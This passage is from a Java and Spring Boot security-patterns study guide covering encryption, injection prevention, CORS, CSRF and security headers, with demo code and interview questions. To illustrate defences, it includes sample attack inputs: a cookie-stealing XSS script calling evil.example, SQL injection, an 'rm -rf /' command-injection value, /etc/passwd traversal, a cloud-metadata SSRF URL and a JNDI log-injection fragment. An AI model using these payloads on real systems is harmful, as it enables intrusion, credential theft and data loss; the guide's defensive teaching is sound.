    public String convertToEntityAttribute(String db)   { return db == null ? null : cipher.decryptFromBase64(db); }
}

@Entity
class Customer {
    @Convert(converter = EncryptedStringConverter.class)
    private String panNumber;                             // stored encrypted; searching by it needs a separate blind index (HMAC)
}
```

> In production, TLS often terminates at a load balancer or ingress, with **mTLS inside the mesh**. Make sure every hop is encrypted, not just the internet-facing one.

| Cloud service | Purpose |
|---|---|
| AWS KMS / Azure Key Vault / GCP KMS | Master keys, envelope encryption, key rotation, audit |
| CloudHSM / Managed HSM | Dedicated hardware key storage (compliance) |
| Vault Transit engine | "Encryption as a service" without apps holding keys |
| cert-manager / ACM | Automated TLS certificates |

#### 📘 Terms Explained

| Term | Simple meaning |
|---|---|
| **HSTS** | HTTP Strict Transport Security: tells browsers to always use HTTPS for a domain. |
| **mTLS** | Mutual TLS: both sides present certificates. |
| **TDE** | Transparent Data Encryption: the database encrypts its files automatically. |
| **AAD** | Additional Authenticated Data: data checked by GCM's tag but not encrypted. |
| **SSL bundle** | Spring Boot's named collection of key/trust material, reusable by servers and clients. |
| **Blind index** | A keyed hash (HMAC) of an encrypted value stored alongside it, so you can search by equality. |

---

## 6.6 Pitfalls, Interview Questions and Cheat Sheet

| Pitfall | Fix |
|---|---|
| AES/ECB mode or no integrity (CBC without MAC) | AES-GCM (authenticated encryption). |
| Reusing an IV/nonce with the same key | Random 12-byte IV per encryption (or a counter), stored with the ciphertext. |
| Hard-coded keys / keys next to the data | KMS/HSM, envelope encryption. |
| TLS only at the edge | Internal TLS/mTLS too (zero trust). |
| Disabling certificate validation "temporarily" (`trustAll`) | Never; fix the trust store. |
| Confusing Base64 with encryption | Base64 is encoding, readable by anyone. |
| Letting certificates expire | Automated renewal + expiry alerts. |

**Q1. Encryption at rest vs in transit?** In transit: TLS protects data moving over networks. At rest: disk/DB/field-level encryption protects stored data and backups. You need both.

**Q2. Hashing vs encryption vs encoding?** Hashing is one-way (passwords, integrity). Encryption is reversible with a key (confidentiality). Encoding is reversible by anyone (format only).

**Q3. Why AES-GCM?** It's authenticated encryption: it provides confidentiality and detects tampering (auth tag), and supports associated data. It requires a unique nonce per encryption.

**Q4. What is envelope encryption?** Data is encrypted with a data key; the data key is encrypted (wrapped) with a master key held in a KMS. Only wrapped keys are stored; rotation re-wraps small keys instead of re-encrypting all data.

**Q5. What does HSTS do?** It tells browsers to use only HTTPS for the site for a period, preventing downgrade/strip attacks.

```
ENCRYPTION  In transit: TLS 1.3/1.2 everywhere (edge AND internal), HTTPS only + HSTS, automated certs, mTLS between services.
          At rest: disk/TDE (stolen media) < column/field-level < app-level (protects from DB users too).
          AES-256-GCM (auth tag, unique 12-byte IV, AAD), keys in KMS/HSM, envelope encryption (DEK wrapped by KEK), rotation.
          Encoding (Base64) != hashing (one-way) != encryption (keyed, reversible) != MAC/signature (integrity).
          Spring Boot: SSL bundles (server.ssl.bundle, spring.ssl.bundle.*), JPA AttributeConverter for fields, Vault Transit.
```

---

## 6.7 Types and Variants, Pros and Cons

| Variant | Where encryption happens | Example |
|---|---|---|
| **TLS in transit** | Between client and server (and between services) | HTTPS, TLS 1.3, mTLS in a service mesh |
| **Full-disk / volume encryption at rest** | Storage layer | AWS EBS/RDS encryption, LUKS, BitLocker |
| **Transparent Data Encryption (TDE)** | Database files | Oracle TDE, SQL Server TDE, MySQL InnoDB encryption |
| **Application-level (field) encryption** | The app encrypts specific fields before storing | Card numbers, Aadhaar/SSN with AES-GCM |
| **Envelope encryption** | Data key encrypts data; a KMS master key encrypts the data key | AWS KMS, GCP KMS, Vault Transit |
| **Client-side / end-to-end** | Only end users hold the keys | Signal protocol, client-side encrypted backups |

| Pros | Cons |
|---|---|
| Stolen disks/backups/packets are useless without keys | Key management is hard (rotation, access, loss = data loss) |
| Required by regulations (PCI-DSS, HIPAA, GDPR) | Field encryption blocks searching and indexing on those fields |
| Envelope encryption makes rotation cheap | CPU and latency overhead (small with AES-NI and TLS 1.3) |

# 7. Input Validation, Injection Prevention and Output Encoding (Interview Imp - Java)

## 7.1 What Are They?

**Injection** happens when **untrusted input is treated as code or commands**: SQL, HTML/JavaScript, OS commands, file paths, LDAP or XML. The defences:

- **Input validation:** check that input has the expected type, length, format and range (**allow-lists**), and reject the rest.
- **Parameterized queries / safe APIs:** keep data **separate from code**, so input can never change the structure of a query or command.
- **Output encoding:** when writing data into HTML, JavaScript, URLs or CSS, encode it for **that context** so it's displayed as text, not executed.

**Analogy:** A bank form with separate boxes. You write the amount in the "amount" box; the clerk never reads it as an instruction, even if you write "and also transfer everything to account X". Mixing data and instructions in one line is where injection begins.

#### 📘 Terms Explained

| Term | Simple meaning |
|---|---|
| **Injection** | Untrusted data interpreted as part of a command or query. |
| **SQL injection** | Input that changes the meaning of an SQL statement. |
| **XSS (Cross-Site Scripting)** | Injected script running in other users' browsers. |
| **Parameterized query / prepared statement** | SQL with placeholders (`?`) whose values are sent separately as data. |
| **Output encoding / escaping** | Converting special characters (`<`, `"`) into safe representations for the output context. |
| **Allow-list vs block-list** | Accept only known-good patterns vs try to reject known-bad ones (weaker). |

---

## 7.2 Why Do We Need It?

| Injection type | Example input | Impact | Defence |
|---|---|---|---|
| **SQL injection** | `' OR '1'='1` | Read/modify/delete any data, bypass login | Parameterized queries, ORM parameters, least-privilege DB user |
| **XSS** | `<script>...</script>` in a review | Steal sessions, act as the victim | Context-aware output encoding, CSP, `HttpOnly` cookies |
| **Command injection** | `file.pdf; rm -rf /` | Run OS commands on the server | Avoid shells; `ProcessBuilder` with argument lists; allow-lists |
| **Path traversal** | `../../etc/passwd` | Read arbitrary files | Normalise + check the path stays under the base directory; use IDs instead of names |
| **SSRF** | `url=http://169.254.169.254/latest/meta-data/` | Server fetches internal resources (cloud credentials) | Allow-list destinations; block private/metadata IPs; no redirects |
| **XXE** | XML with an external entity | Read files, SSRF via the XML parser | Disable DTDs/external entities in XML parsers |
| **Insecure deserialization** | Crafted Java serialized object | Remote code execution | Don't deserialize untrusted Java objects; JSON with type allow-lists; `ObjectInputFilter` |
| **Log injection** | Input containing newlines / `${jndi:...}` | Forged log lines; Log4Shell (2021) | Encode CR/LF; keep libraries patched |

---

## 7.3 How It Works: Defence Layers

1. **Validate on input** (type, length, range, format, allow-lists), on the **server**, at the boundary.
2. **Use safe APIs** that separate code from data: prepared statements, ORM parameters, `ProcessBuilder(List)`, path normalisation.
3. **Encode on output** for the exact context (HTML body, HTML attribute, JavaScript, URL, CSS).
4. **Contain the damage:** least-privilege DB accounts, CSP, sandboxing, network egress rules.

> **Validation isn't enough on its own** (a name like `O'Brien` is valid and still contains a quote), and **encoding isn't a substitute for parameterized queries**. Use each for its purpose.

---

## 7.4 Complete Java Example - SQL Injection, XSS, Path Traversal and Validation

```java
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;

// How injection works: untrusted data becoming CODE. The fix: keep data as DATA (parameters, encoding, normalisation).
public class InjectionDemo {
    record Row(String username, String role) {}
    static final List<Row> USERS = List.of(new Row("asha", "USER"), new Row("ravi", "USER"), new Row("root", "ADMIN"));

    // A toy SQL "engine" that understands WHERE username = '<x>' [OR '<a>'='<b>']
    static List<Row> runSql(String sql) {
        String where = sql.substring(sql.indexOf("WHERE") + 6);
        List<Row> out = new ArrayList<>();
        for (Row r : USERS) if (evaluate(where, r)) out.add(r);
        return out;
    }
    static boolean evaluate(String where, Row r) {
        for (String clause : where.split(" OR ")) {
            String[] kv = clause.split("=", 2);
            String left = kv[0].trim(), right = kv[1].trim().replaceAll("^'|'$|--.*$", "").replaceAll("'\\s*$", "");
            String leftValue = left.equals("username") ? r.username() : left.replaceAll("'", "");
            if (leftValue.equals(right)) return true;
        }
        return false;
    }

    // Parameterized: the value is bound as data, it can never change the query's structure
    static List<Row> parameterized(String username) {
        return USERS.stream().filter(r -> r.username().equals(username)).toList();
    }

    static String htmlEncode(String s) {
        StringBuilder b = new StringBuilder();
        for (char c : s.toCharArray()) {
            switch (c) {
                case '<' -> b.append("&lt;"); case '>' -> b.append("&gt;"); case '&' -> b.append("&amp;");
                case '"' -> b.append("&quot;"); case '\'' -> b.append("&#x27;"); default -> b.append(c);
            }
        }
        return b.toString();
    }

    public static void main(String[] args) {
        String input = "nobody' OR '1'='1";
        String concatenated = "SELECT * FROM users WHERE username = '" + input + "'";
        System.out.println("1) SQL injection");
        System.out.println("   concatenated SQL : " + concatenated);
        System.out.println("   rows returned    : " + runSql(concatenated).size() + " of " + USERS.size() + "  <- every user, including ADMIN");
        System.out.println("   parameterized    : WHERE username = ?  [bind: \"" + input + "\"] -> rows returned: " + parameterized(input).size());

        System.out.println("2) Cross-site scripting (XSS) in a product review");
        String review = "<script>fetch('https://evil.example/c?'+document.cookie)</script>";
        System.out.println("   rendered raw     : <p>" + review + "</p>   <- browser would RUN it");
        System.out.println("   HTML-encoded     : <p>" + htmlEncode(review) + "</p>");

        System.out.println("3) Path traversal in GET /files?name=...");
        Path base = Path.of("/srv/app/uploads").normalize();
        for (String name : List.of("invoice-42.pdf", "../../../etc/passwd")) {
            Path resolved = base.resolve(name).normalize();
            System.out.printf("   %-22s -> %-30s %s%n", name, resolved, resolved.startsWith(base) ? "allowed" : "BLOCKED (escapes upload dir)");
        }

        System.out.println("4) Input validation with an allow-list (not a block-list)");
        Map<String, String> fields = Map.of("pincode", "411001", "quantity", "-3", "email", "asha@example.com");
        System.out.println("   pincode  411001           -> " + (fields.get("pincode").matches("\\d{6}") ? "valid" : "invalid"));
        System.out.println("   quantity -3               -> " + (Integer.parseInt(fields.get("quantity")) > 0 ? "valid" : "invalid (must be > 0)"));
        System.out.println("   email    asha@example.com -> " + (fields.get("email").matches("^[^@\\s]+@[^@\\s]+\\.[a-z]{2,}$") ? "valid" : "invalid"));
    }
}
```

**Output:**
```
1) SQL injection
   concatenated SQL : SELECT * FROM users WHERE username = 'nobody' OR '1'='1'
   rows returned    : 3 of 3  <- every user, including ADMIN
   parameterized    : WHERE username = ?  [bind: "nobody' OR '1'='1"] -> rows returned: 0
2) Cross-site scripting (XSS) in a product review
   rendered raw     : <p><script>fetch('https://evil.example/c?'+document.cookie)</script></p>   <- browser would RUN it
   HTML-encoded     : <p>&lt;script&gt;fetch(&#x27;https://evil.example/c?&#x27;+document.cookie)&lt;/script&gt;</p>
3) Path traversal in GET /files?name=...
   invoice-42.pdf         -> /srv/app/uploads/invoice-42.pdf allowed
   ../../../etc/passwd    -> /etc/passwd                    BLOCKED (escapes upload dir)
4) Input validation with an allow-list (not a block-list)
   pincode  411001           -> valid
   quantity -3               -> invalid (must be > 0)
   email    asha@example.com -> valid
```

What the output shows:
1. **String concatenation** turned the input into SQL: `OR '1'='1` made the condition always true, returning **every user including ADMIN**. With a **parameter**, the whole input is just a (non-matching) username: **0 rows**.
2. The review's `<script>` would **run** in every visitor's browser if rendered raw; **HTML encoding** turned it into harmless visible text.
3. **Path traversal** (`../../../etc/passwd`) resolved outside the upload directory and was **blocked** by normalising the path and checking it still starts with the base directory.
4. **Allow-list validation** accepted a 6-digit pincode and a valid email, and rejected a negative quantity.

---

## 7.5 Injection Prevention in Java and Spring

```java
// SQL: always bind parameters
// ❌ jdbc.query("SELECT * FROM users WHERE email = '" + email + "'", mapper);
jdbc.query("SELECT * FROM users WHERE email = ?", mapper, email);                    // JdbcTemplate
namedJdbc.query("SELECT * FROM users WHERE email = :email", Map.of("email", email), mapper);

@Query("select u from User u where u.email = :email")                                   // Spring Data JPA: named parameter
Optional<User> findByEmail(@Param("email") String email);

// ❌ em.createQuery("from User where email = '" + email + "'")  -> JPQL injection
em.createQuery("from User u where u.email = :email", User.class).setParameter("email", email);

// Dynamic ORDER BY can't be a bind parameter: map from an allow-list instead
String column = Map.of("price", "price", "name", "name").getOrDefault(sortParam, "created_at");
```

```java
// Validation at the API boundary (Jakarta Bean Validation)
public record CreateReviewRequest(
        @NotBlank @Size(max = 2000) String text,
        @Min(1) @Max(5) int stars,
        @Pattern(regexp = "^[A-Z0-9-]{3,20}$") String productSku) {}

@PostMapping("/reviews")
ResponseEntity<Void> create(@Valid @RequestBody CreateReviewRequest req) { ... }   // invalid -> 400 ProblemDetail
```

| Context | Safe default in the Spring world |
|---|---|
| HTML templates | Thymeleaf `th:text` escapes; **`th:utext` does not** (avoid with user data) |
| JSON APIs | Jackson escapes strings; the **frontend** must also avoid `innerHTML` / `dangerouslySetInnerHTML` ([React_Complete_Guide.md](../../react/React_Complete_Guide.md)) |
| Rich text that must allow some HTML | Sanitize with an allow-list library (OWASP Java HTML Sanitizer) |
| OS commands | `new ProcessBuilder(List.of("convert", inputPath, outputPath))`, never `Runtime.exec(String)` with a shell |
| XML | `DocumentBuilderFactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)` |
| Java deserialization | Avoid `ObjectInputStream` on untrusted data; `ObjectInputFilter` allow-lists if unavoidable |
| Outbound URLs (SSRF) | Allow-list hosts; resolve and block private/link-local IPs; disable redirects |

**Stored procedures** help only if they don't build dynamic SQL internally; calling them with string concatenation is still injectable.

#### 📘 Terms Explained

| Term | Simple meaning |
|---|---|
| **Prepared statement** | Pre-compiled SQL with placeholders; values are sent separately and can't change the SQL. |
| **JPQL injection** | SQL-injection's cousin in JPA queries built by string concatenation. |
| **Bean Validation** | Jakarta standard for declaring constraints (`@NotBlank`, `@Size`) on fields. |
| **Sanitizer** | Removes dangerous HTML while keeping allowed tags. |
| **SSRF** | Server-Side Request Forgery: tricking the server into requesting internal URLs. |
| **XXE** | XML External Entity attack via XML parsers that resolve external entities. |
| **Log4Shell** | The 2021 Log4j JNDI lookup vulnerability triggered by logging attacker input. |

---

## 7.6 Pitfalls, Interview Questions and Cheat Sheet

| Pitfall | Fix |
|---|---|
| Block-lists ("remove `<script>`") | Allow-lists for input; proper encoding for output. |
| Client-side validation only | Always validate on the server. |
| Escaping SQL manually | Parameters, always. |
| One encoding for every context | Context-specific encoding (HTML vs attribute vs JS vs URL). |
| Deserializing untrusted Java objects | Use JSON with explicit types; filters. |
| Outdated libraries with known injection CVEs | Dependency scanning and patching. |

**Q1. How do you prevent SQL injection in Java?** Parameterized queries everywhere (`PreparedStatement`, JdbcTemplate `?`, JPA named parameters, Spring Data methods), allow-lists for dynamic identifiers (columns, sort), least-privilege DB users, and input validation.

**Q2. What is XSS and how do you prevent it?** Injected script executing in other users' browsers. Prevent with context-aware output encoding (auto-escaping templates), sanitising rich HTML, a strict Content-Security-Policy, and `HttpOnly` cookies.

**Q3. Is input validation enough to stop injection?** No. Validation reduces risk, but valid data can still contain special characters; parameterization and output encoding are the real defences.

**Q4. How do you stop path traversal?** Don't use user input as paths; use IDs mapped to stored names, or normalise the resolved path and verify it stays inside the allowed directory.

**Q5. What is SSRF and why is it dangerous in the cloud?** The server is tricked into making requests to internal addresses, such as the cloud metadata service (169.254.169.254) that can hand out credentials. Use destination allow-lists, block private IP ranges, and enforce IMDSv2.

```
INJECTION  Untrusted data treated as code. Layers: VALIDATE input (server-side allow-lists, @Valid), SAFE APIs (parameters,
           ProcessBuilder(List), path normalise + startsWith(base)), ENCODE output per context (th:text, not th:utext), CONTAIN (least privilege, CSP).
           SQL: PreparedStatement / JdbcTemplate ? / JPA :param; ORDER BY from allow-list. XSS: encoding + CSP + HttpOnly.
           Also: command injection, path traversal, SSRF (allow-list hosts, block metadata IPs), XXE (disable DTDs),
           insecure deserialization (no ObjectInputStream on untrusted data), log injection.
```

---

## 7.7 Pros and Cons

| Pros | Cons |
|---|---|
| Stops the most common attacks (SQL injection, XSS, path traversal) at the source | Validation rules must be maintained as the domain changes |
| Parameterized queries are simple and fast | Allow-lists can reject valid edge-case input (names with apostrophes) if too strict |
| Bean Validation gives declarative, consistent checks | Validation alone is not enough: always also encode output and use parameters |
| Clear error messages for clients (Problem Details) | Duplicating validation in UI and server needs discipline (server is the authority) |

# 8. Web Security: CORS, CSRF, Security Headers, CSP and Clickjacking

## 8.1 What Are They?

Browsers run code from many websites at once, so they enforce rules to stop one site from abusing another. These patterns are how your server **works with** those browser rules:

| Pattern | Protects against | Mechanism |
|---|---|---|
| **CORS** (Cross-Origin Resource Sharing) | Other websites **reading** your API responses with the user's credentials | Server says which **origins** may call it (`Access-Control-Allow-*` headers) |
| **CSRF protection** | Other websites **performing actions** as a logged-in user (the browser sends cookies automatically) | Anti-CSRF tokens, `SameSite` cookies |
| **Content Security Policy (CSP)** | XSS: running injected or third-party scripts | Header listing allowed script/style/image sources |
| **Clickjacking protection** | Your page loaded invisibly in an `<iframe>` to trick clicks | `frame-ancestors` (CSP) / `X-Frame-Options` |
| **Security headers** | Many browser-side attacks | HSTS, `X-Content-Type-Options`, `Referrer-Policy`, `Permissions-Policy`, cookie flags |

**Same-origin policy (SOP):** by default, a script on `https://evil.example` can't read responses from `https://api.shop.com`. An **origin** = scheme + host + port. CORS **relaxes** SOP for origins you trust; it never makes your API more secure on its own.

**Analogy:** A school with visitor rules. CORS is the list of parents allowed to collect a child (read data). CSRF protection is checking a signed permission slip, because someone wearing a borrowed uniform (the cookie) isn't enough. CSP is the list of approved guest speakers; clickjacking protection stops anyone setting up a fake front door in front of the real one.

#### 📘 Terms Explained

| Term | Simple meaning |
|---|---|
| **Origin** | Scheme + host + port (`https://shop.com:443`). |
| **Same-origin policy** | Browser rule: scripts can only read responses from their own origin unless CORS allows more. |
| **Preflight request** | An `OPTIONS` request the browser sends first to ask if a cross-origin request is allowed. |
| **CSRF** | Cross-Site Request Forgery: a malicious site makes the victim's browser send an authenticated request. |
| **CSP** | Content Security Policy: a header controlling which resources a page may load and run. |
| **Clickjacking** | Hiding your page in a transparent frame so users unknowingly click its buttons. |

---

## 8.2 Why Do We Need Them?

- Cookies are sent **automatically** with requests to your domain, even when the request is triggered by **another** site. Without CSRF protection, `evil.example` can submit a hidden form to `https://bank.com/transfer`.
- A misconfigured CORS policy (`Access-Control-Allow-Origin: *` with credentials, or reflecting any origin) lets any website read users' private data from your API.
- XSS is still one of the most common web bugs; CSP is the **second line of defence** when encoding fails.
- Missing headers leave easy wins for attackers (downgrade to HTTP, MIME sniffing, framing).

---

## 8.3 How They Work

### CORS

1. For "non-simple" requests (JSON `POST`, custom headers, `PUT`/`DELETE`), the browser sends a **preflight** `OPTIONS` with `Origin` and `Access-Control-Request-Method`.
2. The server answers with `Access-Control-Allow-Origin`, `-Methods`, `-Headers`, `-Credentials`, `-Max-Age`.
3. If the answer doesn't allow it, the **browser** blocks the response from the script (the request may still reach the server, which is why CORS isn't a CSRF defence).

**Rules:** allow-list exact origins; never `*` together with credentials; don't reflect the `Origin` header blindly; CORS only matters for browsers (servers and `curl` ignore it).

### CSRF

| Defence | How |
|---|---|
| **Synchronizer token** | Server puts a random token in the session and the page/form; state-changing requests must send it back |
| **Double-submit cookie** | Token in a readable cookie (`XSRF-TOKEN`) + same value in a header (`X-XSRF-TOKEN`); other sites can't read your cookie to copy it |
| **`SameSite` cookies** | `Lax` (browser default) / `Strict`: cookies aren't sent on cross-site POSTs |
| **Check `Origin` / `Sec-Fetch-Site`** | Reject state-changing requests from unexpected origins |
| **Not needed for** | Pure token APIs where the client sends `Authorization: Bearer` explicitly (no cookies) |

### Security headers

| Header | Value (typical) | Purpose |
|---|---|---|
| `Strict-Transport-Security` | `max-age=31536000; includeSubDomains` | Force HTTPS |
| `Content-Security-Policy` | `default-src 'self'; script-src 'self'; object-src 'none'; frame-ancestors 'none'` | Limit script sources (XSS), framing |
| `X-Content-Type-Options` | `nosniff` | Stop MIME-type sniffing |
| `X-Frame-Options` | `DENY` / `SAMEORIGIN` | Older clickjacking defence (CSP `frame-ancestors` supersedes it) |
| `Referrer-Policy` | `strict-origin-when-cross-origin` | Don't leak full URLs (with tokens/IDs) to other sites |
| `Permissions-Policy` | `camera=(), geolocation=()` | Disable browser features you don't use |
| `Cache-Control` | `no-store` on sensitive pages | Don't cache private data in shared caches |
| `Set-Cookie` flags | `Secure; HttpOnly; SameSite=Lax` | Cookie only over HTTPS, hidden from JS, not sent cross-site |

---

## 8.4 Complete Java Example - CORS Decisions, CSRF Tokens and Headers

```java
import java.security.MessageDigest;
import java.nio.charset.StandardCharsets;
import java.util.List;
import java.util.Map;
import java.util.Set;

public class WebSecurityDemo {
    // ---- CORS: the browser asks (preflight) whether a cross-origin request is allowed ----
    static final Set<String> ALLOWED_ORIGINS = Set.of("https://shop.com", "https://admin.shop.com");
    static final Set<String> ALLOWED_METHODS = Set.of("GET", "POST", "PUT");

    static String preflight(String origin, String method) {
        if (!ALLOWED_ORIGINS.contains(origin)) return "no CORS headers -> browser BLOCKS the response";
        if (!ALLOWED_METHODS.contains(method)) return "method not allowed -> browser BLOCKS";
        return "Access-Control-Allow-Origin: " + origin + ", Allow-Methods: GET,POST,PUT, Allow-Credentials: true";
    }

    // ---- CSRF: a cookie-authenticated request must also carry a token the attacker's site can't read ----
    static String transfer(Map<String, String> cookies, Map<String, String> headers, String sessionCsrfToken) {
        if (!cookies.containsKey("SESSION")) return "401";
        String sent = headers.get("X-XSRF-TOKEN");
        if (sent == null || !MessageDigest.isEqual(sent.getBytes(StandardCharsets.UTF_8), sessionCsrfToken.getBytes(StandardCharsets.UTF_8))) {
            return "403 (missing/invalid CSRF token)";
        }
        return "200 transfer done";
    }

    public static void main(String[] args) {
        System.out.println("1) CORS preflight (OPTIONS) decisions");
        for (String[] r : List.of(new String[]{"https://shop.com", "POST"}, new String[]{"https://evil.example", "POST"},
                new String[]{"https://admin.shop.com", "DELETE"})) {
            System.out.printf("   Origin %-24s %-6s -> %s%n", r[0], r[1], preflight(r[0], r[1]));
        }

        System.out.println("2) CSRF: the browser attaches the session cookie automatically, even to forged requests");
        String csrfToken = "c6f1e2d9-token-from-server";
        Map<String, String> cookies = Map.of("SESSION", "abc123");
        System.out.println("   real app (sends cookie + X-XSRF-TOKEN)      -> " + transfer(cookies, Map.of("X-XSRF-TOKEN", csrfToken), csrfToken));
        System.out.println("   evil.example auto-submitted form (cookie only) -> " + transfer(cookies, Map.of(), csrfToken));
        System.out.println("   plus SameSite=Lax cookies: browsers don't send them on cross-site POSTs at all");

        System.out.println("3) Security headers a response should carry");
        Map<String, String> headers = new java.util.LinkedHashMap<>();
        headers.put("Strict-Transport-Security", "max-age=31536000; includeSubDomains");
        headers.put("Content-Security-Policy", "default-src 'self'; script-src 'self'; frame-ancestors 'none'");
        headers.put("X-Content-Type-Options", "nosniff");
        headers.put("X-Frame-Options", "DENY");
        headers.put("Referrer-Policy", "strict-origin-when-cross-origin");
        headers.put("Set-Cookie", "SESSION=abc123; Secure; HttpOnly; SameSite=Lax; Path=/");
        headers.forEach((k, v) -> System.out.printf("   %-26s %s%n", k + ":", v));
    }
}
```

**Output:**
```
1) CORS preflight (OPTIONS) decisions
   Origin https://shop.com         POST   -> Access-Control-Allow-Origin: https://shop.com, Allow-Methods: GET,POST,PUT, Allow-Credentials: true
   Origin https://evil.example     POST   -> no CORS headers -> browser BLOCKS the response
   Origin https://admin.shop.com   DELETE -> method not allowed -> browser BLOCKS
2) CSRF: the browser attaches the session cookie automatically, even to forged requests
   real app (sends cookie + X-XSRF-TOKEN)      -> 200 transfer done
   evil.example auto-submitted form (cookie only) -> 403 (missing/invalid CSRF token)
   plus SameSite=Lax cookies: browsers don't send them on cross-site POSTs at all
3) Security headers a response should carry
   Strict-Transport-Security: max-age=31536000; includeSubDomains
   Content-Security-Policy:   default-src 'self'; script-src 'self'; frame-ancestors 'none'
   X-Content-Type-Options:    nosniff
   X-Frame-Options:           DENY
   Referrer-Policy:           strict-origin-when-cross-origin
   Set-Cookie:                SESSION=abc123; Secure; HttpOnly; SameSite=Lax; Path=/
```

What the output shows:
- **CORS:** the trusted origin got explicit allow headers; an unknown origin got **no CORS headers**, so the browser blocks the response; a disallowed method was refused.
- **CSRF:** both requests carried the session cookie (browsers attach it automatically), but only the real app could send the matching **CSRF token header**; the forged cross-site form got **403**.
- A recommended set of **security headers** and **cookie flags**.

---

## 8.5 Web Security in Spring Security

```java
@Bean
SecurityFilterChain web(HttpSecurity http) throws Exception {
    return http
            .cors(Customizer.withDefaults())                                       // uses the CorsConfigurationSource bean
            .csrf(csrf -> csrf
                    .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())    // XSRF-TOKEN cookie for SPAs
                    .csrfTokenRequestHandler(new CsrfTokenRequestAttributeHandler()))      // plain token handler for JS clients
            .headers(h -> h
                    .contentSecurityPolicy(csp -> csp.policyDirectives(
                            "default-src 'self'; script-src 'self'; object-src 'none'; frame-ancestors 'none'"))
                    .httpStrictTransportSecurity(hsts -> hsts.maxAgeInSeconds(31_536_000).includeSubDomains(true))
                    .referrerPolicy(r -> r.policy(ReferrerPolicyHeaderWriter.ReferrerPolicy.STRICT_ORIGIN_WHEN_CROSS_ORIGIN)))
            .authorizeHttpRequests(a -> a.anyRequest().authenticated())
            .formLogin(Customizer.withDefaults())
            .build();
}

@Bean
CorsConfigurationSource corsConfigurationSource() {
    CorsConfiguration c = new CorsConfiguration();
    c.setAllowedOrigins(List.of("https://shop.com", "https://admin.shop.com"));   // exact origins, never "*" with credentials
    c.setAllowedMethods(List.of("GET", "POST", "PUT"));
    c.setAllowedHeaders(List.of("Content-Type", "X-XSRF-TOKEN"));
    c.setAllowCredentials(true);
    c.setMaxAge(Duration.ofHours(1));
    UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
    source.registerCorsConfiguration("/api/**", c);
    return source;
}
```

| Spring Security default | Notes |
|---|---|
| CSRF protection **on** | Keep it for cookie/session apps; it's reasonable to disable it **only** for stateless APIs authenticated by `Authorization: Bearer` headers |
| Headers on by default | `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY`, `Cache-Control: no-cache` for authenticated responses, HSTS on HTTPS requests, `X-XSS-Protection: 0` |
| CSP **not** set by default | You must define a policy for your app (start with `Content-Security-Policy-Report-Only` to test) |
| CORS off until configured | `.cors()` + a `CorsConfigurationSource` (or `@CrossOrigin` in Spring MVC) |

#### 📘 Terms Explained

| Term | Simple meaning |
|---|---|
| **`CookieCsrfTokenRepository.withHttpOnlyFalse()`** | Stores the CSRF token in a cookie readable by JavaScript, so SPAs can copy it into a header. |
| **`CsrfTokenRequestAttributeHandler`** | Spring Security handler that accepts the raw CSRF token value from requests (useful for SPAs). |
| **`CorsConfigurationSource`** | Spring bean defining CORS rules per URL pattern. |
| **CSP Report-Only** | A header that reports CSP violations without blocking, for safe rollout. |
| **`Sec-Fetch-Site`** | Browser header saying whether a request is same-origin, same-site or cross-site. |

---

## 8.6 Pitfalls, Interview Questions and Cheat Sheet

| Pitfall | Fix |
|---|---|
| `Access-Control-Allow-Origin: *` with credentials, or echoing any `Origin` | Exact allow-list. |
| Thinking CORS stops CSRF | It doesn't: CORS controls **reading** responses; CSRF is about **sending** requests. Use tokens + SameSite. |
| Disabling CSRF on a cookie-session app because "it's an API" | Keep CSRF when browsers authenticate with cookies. |
| CSP with `'unsafe-inline'` scripts | Nonces/hashes for inline scripts; move scripts to files. |
| Session cookies without `HttpOnly`/`Secure`/`SameSite` | Set all three. |

**Q1. What is CORS and when do you need it?** A browser mechanism letting a server allow specific other origins to read its responses. Needed when a frontend on one origin calls an API on another. Allow exact origins; never `*` with credentials.

**Q2. What is CSRF and how do you prevent it?** A malicious site makes the victim's browser send an authenticated request using its cookies. Prevent with anti-CSRF tokens (synchronizer or double-submit), `SameSite` cookies, and origin checks.

**Q3. Do token-based REST APIs need CSRF protection?** Not if the token is sent explicitly in an `Authorization` header (browsers don't add it automatically). If the token or session is in a cookie, yes.

**Q4. What does Content-Security-Policy do?** It restricts where scripts, styles, images and frames can come from, so even if an attacker injects HTML, the browser won't run their script; `frame-ancestors` also prevents clickjacking.

**Q5. Which security headers would you add to every response?** HSTS, CSP, `X-Content-Type-Options: nosniff`, frame protection, `Referrer-Policy`, `Permissions-Policy`, and secure cookie flags.

```
WEB SECURITY  SOP blocks cross-origin reads; CORS relaxes it for allow-listed origins (preflight OPTIONS; never * with credentials).
          CSRF: cookies are auto-sent -> synchronizer / double-submit token (XSRF-TOKEN cookie + X-XSRF-TOKEN header), SameSite=Lax/Strict,
                Origin checks. Not needed for pure Authorization-header APIs.
          Headers: HSTS, CSP (script-src 'self', frame-ancestors 'none'), nosniff, X-Frame-Options, Referrer-Policy, Permissions-Policy.
          Cookies: Secure; HttpOnly; SameSite. Spring: .cors(), .csrf(CookieCsrfTokenRepository), .headers(contentSecurityPolicy, hsts).
```

---

## 8.7 Pros and Cons

| Pros | Cons |
|---|---|
| Browser-enforced protection with a few headers | CSP is hard to roll out on legacy pages with inline scripts (start with `Content-Security-Policy-Report-Only`) |
| Spring Security enables sensible defaults (CSRF, headers) | Misconfigured CORS (`*` with credentials) opens holes |
| Defence in depth against XSS, CSRF and clickjacking | Headers don't fix vulnerable code; they limit damage |
| Cheap to add, easy to test (securityheaders.com, ZAP) | SPA + API setups need careful CSRF/cookie choices (SameSite) |

# 9. Rate Limiting, API Gateway and Defense at the Edge

The master list puts **Rate Limiting** and **API Gateway** under security because they're the first line of defence for every request. Both are covered in depth elsewhere; this section is the security-focused summary.

| Control | Security purpose | Details |
|---|---|---|
| **API gateway** | One place to enforce TLS, authentication (JWT validation), API keys, request size limits, CORS, IP allow/deny lists | [02_Microservices_Pattern.md](../04_Specialized/02_Microservices_Pattern.md#2-api-gateway-and-backends-for-frontends-interview-imp---java) |
| **Rate limiting** | Stops brute-force logins, credential stuffing, OTP guessing, scraping, cost abuse | [02_Reliability_Pattern.md](02_Reliability_Pattern.md#6-rate-limiting-pattern-interview-imp---java) |
| **WAF** (Web Application Firewall) | Blocks common attack patterns (SQLi/XSS signatures, bad bots) | AWS WAF, Cloudflare, ModSecurity/Coraza with OWASP CRS |
